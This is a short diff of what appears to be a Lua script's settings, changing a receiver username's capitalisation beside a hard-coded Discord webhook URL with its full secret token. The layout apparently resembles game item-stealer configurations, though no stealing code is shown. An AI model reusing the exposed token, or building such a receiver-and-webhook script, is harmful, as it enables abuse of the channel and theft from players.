@@ -1,4 +1,4 @@
-Username = "protoxak"
+Username = "Protoxak"
 Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
 
 local recvr=Username
